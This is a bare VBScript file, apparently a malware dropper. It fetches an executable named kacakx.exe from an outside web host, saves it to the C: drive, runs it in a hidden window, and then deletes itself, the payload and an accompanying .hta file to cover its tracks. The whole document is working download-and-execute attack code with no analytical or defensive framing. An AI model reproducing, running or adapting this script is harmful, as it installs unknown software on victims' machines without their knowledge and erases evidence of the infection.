Set FSO = CreateObject("Scripting.FileSystemObject")
Dim BinaryData
Dim xml
Set xml = CreateObject("Microsoft.XMLHTTP")
xml.Open "GET", "http://www.yaqmur.net/kacakx.exe", False 
xml.Send
BinaryData = xml.ResponseBody
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim BinaryStream
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
BinaryStream.Open
BinaryStream.Write BinaryData
BinaryStream.SaveToFile "c:\kacakx.exe", adSaveCreateOverWrite
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "c:\kacakx.exe", 0, true
FSO.DeleteFile "c:\ana.vbs", True
FSO.DeleteFile "c:\kacakx.exe", True
FSO.DeleteFile "c:\tr.hta", True
Set FSO = Nothing
